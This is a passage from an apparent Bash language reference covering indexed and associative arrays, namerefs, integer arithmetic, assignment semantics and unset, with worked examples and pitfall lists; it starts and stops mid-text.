# ⇒ hello, alice

env | grep -F BASH_FUNC_greet
# ⇒ BASH_FUNC_greet
# (the value contains the function body, formatted across multiple lines)
```

### Pitfalls

- `export name` *without* a value exports whatever value `name`
  currently has — including empty. Mark and assign in one step where
  possible.
- `unset name` removes the variable entirely, including its export
  attribute. `export -n name` removes only the attribute.
- A variable assigned **without** `export` inside a function does not
  reach a child even if a parent-scope global of the same name was
  exported — the local shadows the global.
- Tools that read the environment via `/proc/self/environ` or
  `getenv()` see the byte-level encoding, including any nul-terminated
  embedded values. Never put untrusted data into an exported variable.

### See also

- §4.5 — `declare -x` and attribute combinations
- §4.6 — `local` and dynamic scope (locals are not exported by default)
- §4.13 — variable assignment semantics, especially assignment-prefix
- BCS0204 (constants and environment variables)

## 4.9 Indexed arrays

The default array type in Bash. **Indexed** because subscripts are
integers; **sparse** because the indices need not be contiguous. An
indexed array stores zero or more string elements at arbitrary
non-negative integer positions, with no fixed length and no fixed
capacity.

### Creation and assignment

```bash
# scenario: every legitimate way to create an indexed array
declare -a a                    # empty, declared
declare -a b=()                 # empty, declared explicitly
declare -a c=(alpha beta gamma) # populated literal
declare -a d=([5]=x [10]=y)     # sparse literal

# Implicit creation by subscripted assignment
e[0]=first                      # creates e as indexed array

# Append (preserves existing elements; new ones go at end)
c+=(delta epsilon)
declare -p c
# ⇒ declare -a c=([0]="alpha" [1]="beta" [2]="gamma" [3]="delta" [4]="epsilon")
```

Always declare with `-a` (or `-ar` for readonly) at the point of
introduction — implicit creation works but obscures intent. See
BCS0201 and BCS0206.

### Reading elements and metadata

| Expression | Returns |
|------------|---------|
| `${arr[i]}` | element at index `i` (subscript is arithmetic) |
| `${arr[@]}` or `${arr[*]}` | all elements |
| `"${arr[@]}"` | all elements **as separate words** |
| `"${arr[*]}"` | all elements **joined by `IFS[0]`** |
| `${#arr[@]}` | element count (sparse: count of *populated* slots) |
| `${#arr[i]}` | byte-length of element `i` |
| `${!arr[@]}` | populated indices, ascending |
| `"${arr[@]:offset:length}"` | slice of `length` elements starting at *position* (not index) |
| `"${arr[i]:offset:length}"` | substring slice of element `i` |

The `[@]` versus `[*]` distinction is the same load-bearing rule as for
positional parameters (§4.2): `"${arr[@]}"` preserves word boundaries;
`"${arr[*]}"` collapses to one word.

### Sparse arrays

Bash arrays are sparse. Unset elements simply have no index; they do
not exist as "empty slots". `${#arr[@]}` counts *populated* indices,
not the maximum index.

```bash
# scenario: sparse-array semantics
declare -a arr=(a b c)
arr[10]=x
arr[20]=y
unset 'arr[1]'

printf 'count: %d\n' "${#arr[@]}"
# ⇒ count: 4   (indices 0, 2, 10, 20)

printf 'indices: %s\n' "${!arr[*]}"
# ⇒ indices: 0 2 10 20

# Iterating values gives elements only, in index order:
for v in "${arr[@]}"; do printf '<%s>\n' "$v"; done
# ⇒ <a>
# ⇒ <c>
# ⇒ <x>
# ⇒ <y>

# To know which index each value lives at, iterate "${!arr[@]}":
for i in "${!arr[@]}"; do
  printf '[%d]=%s\n' "$i" "${arr[i]}"
done
```

### The copy pitfall

`new=("${old[@]}")` produces a **re-indexed** copy: indices `0, 2, 10,
20` collapse to `0, 1, 2, 3`. This is almost always what you want, but
it loses the sparse structure. To preserve indices verbatim, copy
through the populated-index list.

```bash
# scenario: re-indexing copy versus index-preserving copy
declare -a old=([0]=a [2]=c [10]=x [20]=y)

# Re-indexing copy — sparseness lost
declare -a flat=("${old[@]}")
declare -p flat
# ⇒ declare -a flat=([0]="a" [1]="c" [2]="x" [3]="y")

# Index-preserving copy
declare -a same=()
for i in "${!old[@]}"; do same[i]=${old[i]}; done
declare -p same
# ⇒ declare -a same=([0]="a" [2]="c" [10]="x" [20]="y")
```

The re-indexing copy is sometimes *intended* — for example, when
collapsing a logical "list" that happened to have holes. State the
intent explicitly with a comment if it matters.

### Iteration

The two correct iteration idioms — pick whichever fits.

```bash
declare -a paths=("/etc/passwd" "/var/log/app.log" "name with space")

# Idiom 1: iterate values directly (most common)
for p in "${paths[@]}"; do
  [[ -f $p ]] || continue
  printf 'exists: %s\n' "$p"
done
# ⇒ exists: /etc/passwd
# ⇒ (other paths skipped if absent)

# Idiom 2: iterate indices (when you need the index)
for i in "${!paths[@]}"; do
  printf '[%d] %s\n' "$i" "${paths[i]}"
done
# ⇒ [0] /etc/passwd
# ⇒ [1] /var/log/app.log
# ⇒ [2] name with space
```

Always quote `"${arr[@]}"` — otherwise each element is re-split on
`IFS` and subjected to pathname expansion. See BCS0301 and BCS0206.

### Common operations

- **Append**: `arr+=(x y z)` — add elements at the next free index.
- **Element append**: `arr[3]+='more'` — append to a single element.
- **Delete one element**: `unset 'arr[2]'` — quoting required to
  prevent globbing of `arr[2]` against files in `cwd` when `[`/`]` are
  active glob characters.
- **Delete the array**: `unset arr` — gone, attribute and all.
- **Read a file as lines**: `mapfile -t arr < file` — see §14.3.
- **Length**: `${#arr[@]}` (count) versus `${#arr[i]}` (byte length of
  element `i`).

### Slicing and substring operations

```bash
# scenario: array slicing and per-element substring
declare -a a=(zero one two three four five)

# Slice: position-based, not index-based
printf '%s\n' "${a[@]:1:3}"
# ⇒ one
# ⇒ two
# ⇒ three

# Slice from the end: ${a[@]: -2} (the leading space is required)
printf '%s\n' "${a[@]: -2}"
# ⇒ four
# ⇒ five

# Substring of one element
printf '%s\n' "${a[2]:1:2}"   # element 2 = "two", chars 1-2 = "wo"
# ⇒ wo
```

The slice `${arr[@]:offset:length}` indexes by *position* in the
populated-elements list, not by raw index value. For a sparse array
this is rarely what you want; iterate `"${!arr[@]}"` instead and
filter explicitly.

### Common operations

- **Append**: `arr+=(x y z)` — add elements at the next free index.
- **Element append**: `arr[3]+='more'` — append to a single element.
- **Delete one element**: `unset 'arr[2]'` — quoting required to
  prevent globbing of `arr[2]` against files in `cwd` when `[`/`]` are
  active glob characters.
- **Delete the array**: `unset arr` — gone, attribute and all.
- **Empty without removing**: `arr=()`.
- **Read a file as lines**: `mapfile -t arr < file` — see §14.3.
- **Length**: `${#arr[@]}` (count) versus `${#arr[i]}` (byte length of
  element `i`).
- **Reverse**: no built-in; iterate indices in descending order.
- **Sort**: no built-in; pipe to `sort` and `mapfile -t` back.

```bash
# scenario: sorting an array (LC_ALL=C for byte-wise stability)
declare -a names=(carol alice bob)
mapfile -t names < <(printf '%s\n' "${names[@]}" | LC_ALL=C sort)
declare -p names
# ⇒ declare -a names=([0]="alice" [1]="bob" [2]="carol")
```

### Pitfalls in one place

- **Unquoted expansion**: `for x in ${arr[@]}` re-splits and globs.
  Always `"${arr[@]}"`.
- **`unset arr[i]` without quoting**: a literal file named `arr2` in
  the cwd will be matched and remove the wrong thing. Always
  `unset 'arr[i]'`.
- **`${arr}` with no subscript** is `${arr[0]}` — a frequent silent
  bug when the array is meant to expand to all elements.
- **Comparing two arrays for equality** is not built in — iterate both
  via `${!arr[@]}` and compare element-by-element.
- **Slice offsets are position-based on sparse arrays**. Element 0 in
  the slice is the first *populated* element, not the element at
  index 0.

### See also

- §4.2 — positional parameters (also a sparse word array)
- §4.10 — associative arrays
- §4.13 — compound array assignment expansion rules
- §4.14 — `unset` semantics and quoting
- §14.3 — `mapfile`/`readarray` for line-oriented input
- BCS0201, BCS0206 (array declaration and discipline)

## 4.10 Associative arrays

Hash maps from string keys to string values, available since Bash 4.0.
The complement of indexed arrays: subscripts are arbitrary strings,
iteration order is **not** insertion order, and the type **must** be
declared before first use.

### Declaration

```bash
# scenario: every legitimate way to create an associative array
declare -A by_id                      # empty
declare -A by_id=()                   # empty, explicit
declare -A by_id=([alice]=42 [bob]=17)
declare -Ar STATIC=([a]=1 [b]=2)      # readonly + associative

# Function-scoped form (`local -A`) must appear inside a function:
demo() { local -A counts=(); declare -p counts | head -c 22; echo; }
demo                                  # ⇒ declare -A counts=()
```

The crucial rule: **declare with `-A` before any subscripted assignment.**
Bash does *not* infer associative-array intent from the use of string
subscripts.

### The undeclared-pitfall

```bash
# scenario: assigning a string subscript without -A
m[alice]=42
declare -p m
# ⇒ declare -a m=([0]="42")
```

Without `declare -A`, the subscript `alice` is *evaluated as
arithmetic*. An undefined name evaluates to `0` under arithmetic
evaluation (an exception to `set -u`'s usual behaviour, see §4.12), so
`m[alice]=42` becomes `m[0]=42` in a freshly-created indexed array.
Every subsequent string subscript also evaluates to `0`, silently
overwriting the same slot. This is one of Bash's nastier silent bugs;
the cure is unconditional discipline:

```bash
# right
declare -A m=()
m[alice]=42
m[bob]=17
```

### Reading and writing

```bash
declare -A by_id=([alice]=42 [bob]=17)

printf '%s\n' "${by_id[alice]}"   # ⇒ 42

by_id[alice]+=' (admin)'          # append-to-existing
printf '%s\n' "${by_id[alice]}"   # ⇒ 42 (admin)

by_id[carol]=99                   # new key
unset 'by_id[bob]'                # delete one key (quote!)
```

| Expression | Returns |
|------------|---------|
| `${by_id[k]}` | value for key `k`, or empty if absent |
| `"${by_id[@]}"` | all values, as separate words |
| `"${!by_id[@]}"` | all keys (in hash order — **not** sorted) |
| `${#by_id[@]}` | number of populated keys |
| `${#by_id[k]}` | byte length of value at key `k` |

### Membership testing

`${by_id[k]}` returns the empty string both when the key is missing
and when the value *is* the empty string. To distinguish, use `[[ -v
… ]]`:

```bash
# scenario: distinguishing absent key from empty value
declare -A m=([alice]=42 [bob]='')

[[ -v m[alice] ]] && printf 'alice: present (%s)\n' "${m[alice]}"
[[ -v m[bob]   ]] && printf 'bob:   present (%s)\n' "${m[bob]}"
[[ -v m[carol] ]] || printf 'carol: absent\n'
# ⇒ alice: present (42)
# ⇒ bob:   present ()
# ⇒ carol: absent
```

The `-v` test on `m[k]` is the only correct membership predicate for
associative arrays. Comparing `${m[k]:-}` to a sentinel value works
only if you can guarantee no legitimate value is the sentinel.

### Deterministic iteration

Hash-table order is not stable across Bash builds, across versions, or
across runs of the same script with different insertion orders. **Any
output that needs to be reproducible must explicitly sort the keys.**

```bash
# scenario: deterministic iteration via key sort
declare -A by_id=([carol]=99 [alice]=42 [bob]=17)

# Hash order — non-deterministic
for k in "${!by_id[@]}"; do
  printf '%-6s = %s\n' "$k" "${by_id[$k]}"
done
# (the three `key = value` lines come out in some hash-dependent order)

# Deterministic — sort keys explicitly
declare -a sorted=()
mapfile -t sorted < <(printf '%s\n' "${!by_id[@]}" | LC_ALL=C sort)
for k in "${sorted[@]}"; do
  printf '%-6s = %s\n' "$k" "${by_id[$k]}"
done
# ⇒ alice  = 42
# ⇒ bob    = 17
# ⇒ carol  = 99
```

The `LC_ALL=C` prefix forces byte-wise sort and avoids locale-dependent
collation surprises (German *ß*, Turkish *İ*, etc.). For numeric-string
keys, add `-n`; for case-insensitive sort, `-f`. See §22.7 for the
broader pattern.

### Operations summary

- **Add or replace**: `m[k]=v`
- **Append to value**: `m[k]+=more`
- **Delete one key**: `unset 'm[k]'` (quoting required)
- **Delete the array**: `unset m`
- **Empty without removing**: `m=()`
- **Copy**: no built-in deep copy; iterate keys.

```bash
# scenario: copying an associative array
declare -A copy=()
for k in "${!src[@]}"; do copy[$k]=${src[$k]}; done
```

### Pitfalls

- **Forgetting `declare -A`** — silently creates an indexed array (see
  above).
- **`unset m[k]`** without quotes — globbing risk if `m` happens to
  match a file pattern.
- **Iteration assumed ordered** — sort if order matters.
- **Numeric-looking string keys**: `m[1]` and `m['1']` and `m[$((0+1))]`
  all refer to the *same* key in an associative array (the key is the
  string `"1"`), but in an *indexed* array they refer to slot `1`.
  Discipline: declare type up front so the contract is unambiguous.

### See also

- §4.5 — `declare -A` and the attribute system
- §4.9 — indexed arrays (the integer-keyed sibling)
- §4.12 — arithmetic context and the `set -u`/zero edge case
- §4.14 — `unset` semantics and quoting requirements
- §22.7 — sorted iteration patterns
- BCS0201, BCS0206 (array declaration discipline)

## 4.11 Namerefs (`-n`)

A nameref is a variable whose value is the **name** of another variable;
reads and writes through the nameref are forwarded to the referenced
target. Bash's only pointer-like construct, namerefs are the canonical
mechanism for output parameters, indirect access to arrays, and
generic algorithms that operate on caller-supplied variable names.

### Declaration and basic use

```bash
# scenario: declaration, read, write
declare -- target='original'
declare -n ref=target

printf '%s\n' "$ref"         # ⇒ original   (read forwarded)
ref='via nameref'             # write forwarded
printf '%s\n' "$target"      # ⇒ via nameref
```

The nameref is itself a variable; what makes it special is the `-n`
attribute — its assigned value (`target`) is interpreted as the *name*
of another variable, and every read/write goes through that name.

`local -n` is the function-scoped form. The reference dies when the
function returns; the target is unaffected.

### The output-parameter pattern

The dominant use of namerefs in production Bash is to *return* values
from functions other than via stdout. Without namerefs, a function
that needs to "return" a non-trivial value (an array, a structured
object, multiple values) must echo and have the caller capture via
`$()` — which forks a subshell, loses array-ness, and serialises
everything to text. Namerefs fix this.

```bash
# scenario: output parameter — returning an array
fetch_records() {
  local -n out=$1            # caller-supplied array name
  out=()                     # reset
  out+=('alice|42')
  out+=('bob|17')
  out+=('carol|99')
}

declare -a results=()
fetch_records results
printf '%s\n' "${results[@]}"
# ⇒ alice|42
# ⇒ bob|17
# ⇒ carol|99
```

The contract is documented at the call site: "first argument is the
name of an array I will fill". Combine with `declare -n out=$1` as
the **first** line of the function so the indirection is unmissable.

### Indirect access to arrays and elements

```bash
# scenario: nameref to an array, and to a single element
declare -a colours=(red green blue)
declare -A by_id=([alice]=42 [bob]=17)

declare -n alias=colours
printf '%s\n' "${alias[1]}"      # ⇒ green
alias+=(yellow)
printf '%s\n' "${colours[3]}"    # ⇒ yellow

declare -n cell=by_id[alice]     # nameref to a single map element
cell='42 (admin)'
printf '%s\n' "${by_id[alice]}"  # ⇒ 42 (admin)
```

Note that `${!ref}` does **not** behave intuitively on a nameref. The
`${!name}` indirection form predates namerefs and looks up "the
variable whose name is the value of `name`" — for a nameref, this is
the *target's* value, but indirected one extra level (i.e. it expects
the target's *value* to itself be a variable name). Just write `$ref`
or `${ref}` and let the nameref do its job.

### Cycles and self-reference

Bash detects simple nameref cycles and refuses to follow them:

```bash
declare -n a=b
declare -n b=a
echo "$a"
# ⇒ bash: warning: a: circular name reference
```

The classic shadowing pitfall is more insidious: declaring a nameref
*with the same name* as its intended target. Inside a function, `local
-n self=self` (or whatever the caller passed) creates a local that
*shadows* the global `self`, and the nameref then refers to itself —
producing a circular reference. The fix is to choose a nameref name
that **cannot collide** with anything the caller might pass.

```bash
# wrong — caller passes "out" as the variable to fill, and the
#         function names its nameref "out" too
fill() {
  local -n out=$1     # if caller's variable is also named 'out',
  out=(a b c)         # 'out' shadows itself ⇒ circular reference
}

declare -a out=()
fill out 2>&1 | head -1   # → "warning: out: circular name reference" on stderr

# right — pick an unlikely internal name
fill() {
  local -n __fill_out=$1
  __fill_out=(a b c)
}
declare -a result=()
fill result
printf '%s\n' "${result[@]}"   # ⇒ a
                                # ⇒ b
                                # ⇒ c
```

The convention is to prefix the nameref's local name with the function
name and a leading underscore (`__fill_out`, `__merge_dest`) — ugly
but collision-proof.

### Pitfalls collected

- **Shadowing**: a nameref must not share its name with the variable
  it points to. Use a function-prefixed local.
- **`declare -n` after the value has been assigned**: combining
  attributes is order-sensitive — `declare -n ref; ref=target` works,
  but `declare ref=target; declare -n ref` does not retroactively make
  `ref` a nameref.
- **Empty target**: `declare -n ref=` is rejected. Initialise the
  reference at the moment of declaration.
- **Crossing scope boundaries**: a `local -n` that points at a *local*
  in a callee that has already returned is a dangling reference; Bash
  errors out on use.
- **`unset ref` removes the nameref, not the target**, **unless** you
  use `unset -n ref` — and even that varies by version. Prefer
  letting the local fall out of scope naturally.

### When *not* to use a nameref

- For pure-value return — echo to stdout and capture with `$()`. Cheaper
  to reason about.
- For configuration data shared across many functions — use a global
  with a documented name. Namerefs are for plumbing, not architecture.

### See also

- §4.5 — `declare` and the `-n` attribute
- §4.6 — `local` and dynamic scope (interaction with namerefs)
- §4.9, §4.10 — arrays (the most common nameref targets)
- BCS0202 (variable scoping), BCS0411 (subshell return-value patterns)

## 4.12 Integer arithmetic semantics

Bash arithmetic is **signed 64-bit integer** on every modern Linux
build. There is no built-in floating point, no big-integer library,
and no exception on overflow. This chapter pins down the type system
and its sharp edges before §17 covers operators in full.

### Integer width and overflow

- **Width**: signed 64-bit on LP64 Linux (the universal modern case).
  On 32-bit i386 builds, signed 32-bit. The width is determined at
  compile time of the Bash binary, not at runtime; check
  `${BASH_VERSINFO[5]}` (machine-arch tuple) if you must.
- **Overflow wraps silently** — no exception, no diagnostic, no exit
  code. `2**63` overflows to a negative number; `2**64` to zero.
- **Underflow** wraps the same way: `-(2**63) - 1` becomes the
  maximum positive value.
- **Division rounds toward zero**: `(-7)/2 == -3`, not `-4`.
- **Modulo follows the sign of the dividend**: `(-7) % 3 == -1`.

```bash
# scenario: overflow, base prefixes, division semantics
declare -i x

x=$((2**62))            # 4611686018427387904 — fine
printf 'half-max:  %d\n' "$x"

x=$((2**63))            # overflow: wraps to a negative
printf 'overflow:  %d\n' "$x"
# ⇒ overflow:  -9223372036854775808

x=0xff                  # hex prefix
printf 'hex 0xff:  %d\n' "$x"          # ⇒ 255

x=0755                  # leading-zero prefix means OCTAL
printf 'oct 0755: %d\n' "$x"           # ⇒ 493 — not 755 the decimal!

x=$((16#deadbeef))      # explicit base#digits
printf 'hex DEADBEEF: %d\n' "$x"       # ⇒ 3735928559

x=$((-7 / 2))
printf 'trunc div:  %d\n' "$x"         # ⇒ -3   (toward zero)

x=$((-7 % 2))
printf 'modulo:     %d\n' "$x"         # ⇒ -1   (sign follows dividend)
```

The **leading-zero-is-octal** rule is one of Bash's most common
silent-bug traps. Filenames with date stamps, port numbers with
leading zeros, version strings — all of these can innocently land in
arithmetic context and produce wrong answers. Strip leading zeros
explicitly with `${var#0}` or use the `10#` base prefix:
`$((10#$value))` forces decimal.

### Base prefixes

| Prefix | Meaning |
|--------|---------|
| `0` (literal zero) | Octal — digits 0-7 |
| `0x` or `0X` | Hexadecimal — digits 0-9, a-f, A-F |
| `BASE#NUM` | Arbitrary base, 2 ≤ BASE ≤ 64 |

Bases 11–36 use letters case-insensitively (`16#FF == 16#ff == 255`).
Bases 37–64 are case-sensitive: lowercase first, then uppercase, then
`@` and `_`. Worth knowing only because base 64 occasionally appears in
encoding scripts.

### `set -u` and the arithmetic-context exception

`set -u` (`-o nounset`) treats reading an unset variable as a fatal
error in *most* contexts. Arithmetic context is the conspicuous
exception:

```bash
# scenario: set -u inconsistency in arithmetic context
set -u

unset MAYBE
printf '%s\n' "$MAYBE"
# ⇒ bash: MAYBE: unbound variable          (script aborts)

set -u
unset MAYBE
printf '%d\n' "$((MAYBE + 1))"
# ⇒ 1                                       (no error; MAYBE evaluates to 0)
```

Inside `(( … ))`, `$(( … ))`, `let`, array subscripts, and `for ((…))`,
an undefined name **silently evaluates to zero**. This is intentional
historical behaviour from `ksh` but it interacts badly with `set -u`'s
guarantees: a typo in a variable name does not abort, it produces zero
and continues. Defensive coding: gate arithmetic on names you trust to
be initialised, or use the explicit-default form `${MAYBE:-0}` to make
the default visible.

### No floating point

There is no `float` or `double` in Bash. For:

- **Money / fixed-point**: scale to integer cents (or microunits) and
  format with `printf '%d.%02d'`.
- **Real arithmetic**: shell out to `bc -l`, `awk`, `python3 -c`, or
  `dc`. Pick whichever is least surprising for the project.
- **Comparisons of decimal strings**: convert to integer scaled
  representation; never use Bash arithmetic on `"3.14"` (it's a syntax
  error inside `(( ))`).

```bash
# scenario: scaled fixed-point for currency
declare -i cents=12345
printf '%d.%02d\n' "$((cents / 100))" "$((cents % 100))"
# ⇒ 123.45
```

### Arithmetic contexts — where evaluation happens

Arithmetic evaluation is automatic inside:

- `(( expr ))` — pure evaluation, exit 0 if non-zero, 1 if zero.
- `$(( expr ))` — value-yielding expansion.
- `let expr [...]` — legacy form, equivalent to `(( ))` per argument.
  Avoid in new code; `(( ))` is clearer and quotes nothing weirdly.
- `arr[expr]=…` — subscripts in array assignment.
- `${arr[expr]}` — subscripts in array reference.
- `for ((init; test; step))` — C-style loop heads.
- `${var:offset:length}`, `${var: -N}` — substring/slice operands.

Outside these contexts, an arithmetic-looking expression is **string
data**: `x=2+3` stores the literal three-character string `2+3`.

### Pitfalls in one place

- **Leading-zero octal**: `$((08))` is a syntax error; `$((010))` is
  `8` not `10`. Strip leading zeros first.
- **Pre/post increment with `set -e`**: `((count++))` returns the *old*
  value; if it was zero, the `(( ))` exits non-zero, and `set -e`
  aborts. The BCS form is `count+=1` (BCS0505).
- **Quoting inside `(( ))`**: not needed and not helpful — quotes
  inside arithmetic context are themselves part of the expression.
- **Comparing strings as numbers**: `[[ "$a" -lt "$b" ]]` works because
  `[[ ]]` evaluates `-lt` arguments as arithmetic; `[[ "$a" < "$b" ]]`
  is *lexical* comparison. Use `(( a < b ))` when intent is numeric.

### See also

- §4.13 — assignment semantics, including `declare -i` evaluation
- §13 — arithmetic expansion in full
- §17 — arithmetic operators, precedence, and edge cases
- BCS0505 (arithmetic operations)

## 4.13 Variable assignment semantics

The exact sequence of operations that take place when Bash executes
`name=value`. This is not "how to assign a variable" — it is which
**expansions** apply, in which **order**, and how scalar versus
compound array assignment differ. Most surprises in Bash come from
the differences listed here.

### The scalar assignment pipeline

For `name=value` (scalar):

1. RHS is subject to **tilde expansion**, **parameter expansion**,
   **command substitution**, **arithmetic expansion**, and **process
   substitution**.
2. RHS is **NOT** subject to **word splitting** or **pathname
   expansion** (globbing).
3. The resulting single string is bound to `name`.

This is why `arr2=$1` works correctly even when `$1` contains spaces or
`*` — those characters are taken literally on the RHS of a scalar
assignment.

```bash
# scenario: scalar RHS — no splitting, no globbing
shopt -s nullglob
declare -- pattern='*.txt'

# Inside an assignment, '*' is a literal asterisk:
declare -- str=$pattern
printf '%s\n' "$str"            # ⇒ *.txt    (literal)

# But the same expression as a command argument *does* glob.
# Set up two matching files so the glob has something to expand to:
: > a.txt && : > b.txt
# shellcheck disable=SC2086  # demoing word-splitting/globbing on purpose
printf '%s\n' $pattern
# ⇒ a.txt
# ⇒ b.txt
# (without the demo files, nullglob would expand $pattern to nothing)
```

`declare name=value`, `local name=value`, `readonly name=value`, and
`export name=value` all follow the **same** scalar assignment pipeline:
no splitting, no globbing on the RHS.

### The compound array assignment pipeline

For `arr=( word1 word2 … )` (compound):

1. Each *word* between the parentheses is independently subject to
   **all** expansions, including **tilde**, **parameter**, **command
   substitution**, **arithmetic**, **process substitution**, **word
   splitting**, **AND pathname expansion**.
2. The resulting list of words populates the array, one element per
   resulting word.

The presence of word splitting and globbing is the load-bearing
difference: a value that's safe in a scalar assignment is *not*
necessarily safe in a compound assignment.

```bash
# scenario: scalar vs compound, side by side
shopt -s nullglob
declare -- a='one two three'
declare -- glob='*.md'

# Scalar: the entire RHS is one string
declare -- s1=$a
printf 'scalar: <%s>\n' "$s1"
# ⇒ scalar: <one two three>

# Compound, unquoted reference: word splitting happens
declare -a arr1=( $a )
printf 'arr1[%d]=<%s>\n' 0 "${arr1[0]}" 1 "${arr1[1]}" 2 "${arr1[2]}"
# ⇒ arr1[0]=<one>
# ⇒ arr1[1]=<two>
# ⇒ arr1[2]=<three>

# Compound, quoted reference: one element preserved
declare -a arr2=( "$a" )
printf 'arr2[%d]=<%s>\n' 0 "${arr2[0]}"
# ⇒ arr2[0]=<one two three>

# Compound, unquoted glob: PATHNAME EXPANSION happens
: > demo1.md && : > demo2.md
# shellcheck disable=SC2206  # word-splitting + globbing into array is the demo
declare -a arr3=( $glob )
declare -p arr3
# ⇒ declare -a arr3=
# (with the two demo files above, expect `[0]="demo1.md" [1]="demo2.md"`;
#  without matching files plus `nullglob`, the array stays empty)
```

The rule of thumb: inside `( … )`, treat each word exactly as you
would treat a command argument — quote whenever you would quote a
command argument.

### Append assignment `+=`

- **Scalar `+=`**: appends to the existing value.
  `s='hello, '; s+='world'` ⇒ `'hello, world'`.
- **Integer `-i` `+=`**: arithmetic addition.
  `declare -i n=5; n+=3` ⇒ `8`.
- **Indexed array `+=`**: appends elements at the next free index.
  `arr=(a b); arr+=(c d)` ⇒ `(a b c d)`.
- **Associative array `+=`**: same expansion rules as `=` for the new
  pairs.
- **Single element `arr[i]+=`**: appends to that one element's value.

`+=` preserves the variable's attributes; `=` also preserves them
(despite a persistent myth otherwise). The only way to remove an
attribute is `declare +X` or `unset`.

### Array subscripts are arithmetic

In `arr[i]=value`, the subscript `i` is evaluated in arithmetic
context. This is true for both indexed and associative arrays —
**except** that for an associative array, the *result* of arithmetic
evaluation is a string and is used as a key as-is.

```bash
declare -a a=()
declare -i offset=2
a[offset+1]='foo'         # → assigns to a[3] (subscript is arithmetic)
declare -p a              # ⇒ declare -a a=([3]="foo")

declare -A m=()
m[$((1+1))]='bar'         # key is the literal string "2"
declare -p m              # ⇒ declare -A m=
# (key "2", value "bar"; bash 5.2 prints `[2]="bar" )` with a trailing space)
```

### Multiple assignments on one line

```bash
a=1 b=2 c=3 cmd          # all in cmd's environment, NOT in current shell
a=1 b=2                  # all in CURRENT shell (no command follows)
```

The *presence of a command* changes the scope. With a command, the
assignments are temporary exports for that command's environment only
(see §4.8 for the assignment-prefix-command rule). Without a command,
the assignments persist in the current shell.

### `declare -i` and RHS arithmetic

A variable with the `-i` attribute interprets its RHS as an arithmetic
expression on every assignment:

```bash
declare -i x
x='2 + 3'                # ⇒ x=5
x=$(date +%s)            # date's output is a digit string ⇒ valid integer
x='hello'                # ⇒ x=0  (non-numeric reduces to 0; no error!)
```

The silent reduction of non-numeric strings to `0` is a known footgun
— validate input *before* assigning to an `-i` variable when the
source is untrusted.

### Read-only at assignment time

```bash
declare -r x=42
(x=43) 2>&1 || true      # → "bash: x: readonly variable" on stderr
# (the subshell isolates the failing assignment so the outer set -e
#  shell stays alive)
```

Readonly is enforced at assignment, not at declaration. There is no
mechanism to remove `-r` before script exit.

### See also

- §4.5 — `declare` and the attribute system
- §4.8 — assignment-prefixed commands and exports
- §4.9, §4.10 — array creation and indexing details
- §13 — full expansion rules (tilde, parameter, command, arithmetic, …)
- BCS0201 (type-specific declarations), BCS0301 (quoting fundamentals)

## 4.14 Unsetting

`unset` removes a variable or a function from the shell's symbol
tables. Three flag forms disambiguate the target, and a quoting rule
applies when an array element is the target. The operation is the
mirror of `declare`: both create and destroy storage, both honour the
readonly bar.

### Surface area

- `unset name` — variable, falling back to function if no variable
  with that name exists. Ambiguous; prefer the explicit forms.
- `unset -v name` — variable only.
- `unset -f name` — function only.
- `unset -n name` — when `name` is a nameref, remove the *nameref*
  (not the target it points at). Without `-n`, `unset name` on a
  nameref unsets the **target**.
- `unset 'arr[i]'` — remove a single array element. The single-quotes
  are mandatory to suppress pathname expansion of `[`/`]`.
- `unset arr` — remove the entire array.
- Readonly variables cannot be unset (§4.7).
- Unsetting an exported variable removes it from `environ` as well as
  from the shell.

### Quoting `unset 'arr[i]'`

The `[` and `]` brackets are pathname-expansion metacharacters. With
`shopt -s nullglob` (BCS-default per §5.11) and a glob pattern matching
no files, an unquoted `unset arr[0]` becomes `unset` with no arguments
— silent no-op. Without `nullglob`, an unrelated file named literally
`arr[0]` could be matched. The single-quotes prevent both surprises:

```bash
# scenario: array-element unset must be quoted
#!/usr/bin/env bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -a arr=(zero one two three)
printf '%s\n' "${arr[@]}"
# ⇒ zero
# ⇒ one
# ⇒ two
# ⇒ three

# wrong — at the very least relies on glob luck:
# unset arr[1]                      # may glob, may silently no-op

# right — explicit single-quotes
unset 'arr[1]'
printf '%s ' "${!arr[@]}"; echo     # ⇒ 0 2 3
printf '%s\n' "${arr[@]}"
# ⇒ zero
# ⇒ two
# ⇒ three

# Note: indices do **not** renumber. To compact:
arr=("${arr[@]}")
printf '%s ' "${!arr[@]}"; echo     # ⇒ 0 1 2
```

### Nameref unset — `-n` is the loaded form

For a regular variable, `unset name` removes the variable. For a
nameref, `unset name` follows the indirection and unsets the **target**
— almost never what the author intends. `unset -n name` removes the
nameref binding itself and leaves the target alone:

```bash
# scenario: -n distinguishes "remove the alias" from "remove the value"
#!/usr/bin/env bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -- target='hello'
declare -n alias_=target           # nameref → target

printf 'before:   target=%s alias_=%s\n' "$target" "$alias_"
# ⇒ before:   target=hello alias_=hello

# unset alias_   would unset target — usually wrong
unset -n alias_
printf 'after -n: target=%s alias_=%s\n' "$target" "${alias_:-<unbound>}"
# ⇒ after -n: target=hello alias_=<unbound>
```

### Pitfalls

- **`unset BASH_REMATCH`** after `[[ str =~ re ]]` silently undoes the
  match groups. Capture them into a local array first.
- **Sparse indices after element-unset** — see the example above. The
  `arr=("${arr[@]}")` re-indexing idiom is the canonical compaction
  (BCS0206, §4.9).
- **`unset` of a `local`** while inside the defining function deletes
  the function-scope binding and re-exposes any outer-scope variable
  with the same name (dynamic scope, §4.6).
- **Readonly cannot be unset** (§4.7); `unset` errors and, under
  `set -e`, terminates the script.
- **`unset name` of a function variable removes the variable**, not
  any same-named function. `unset -f name` is the function-only form.

### BCS posture

- Always quote array-element targets: `unset 'arr[i]'` (BCS0301).
- Always prefer the explicit flag — `unset -v` for variables,
  `unset -f` for functions — to avoid the fallback ambiguity.
- Use `-n` whenever a nameref binding is the intended target; the
  unflagged form is almost always wrong with namerefs (BCS0202).
- After deleting an exported variable, remember it is also gone from
  child environments — re-export if children spawned later still need
  it (BCS0204).

**See also**: §4.5 (`declare`/attributes), §4.6 (`local --` and
dynamic scope), §4.7 (readonly bar), §4.9 (indexed arrays and
sparseness), §4.11 (namerefs).

# Part V — Expansions

*Bash performs eight expansions in a fixed order on every command line. Most "Stack Overflow Bash bugs" trace to a misunderstanding of which expansion runs when, on what, and producing what. This Part documents each expansion, the order, and the rules.*

---

---

## 5.1 Order of expansions

The canonical sequence Bash performs between reading a command and
calling `execve`. Memorise this order — the rest of Part V is one
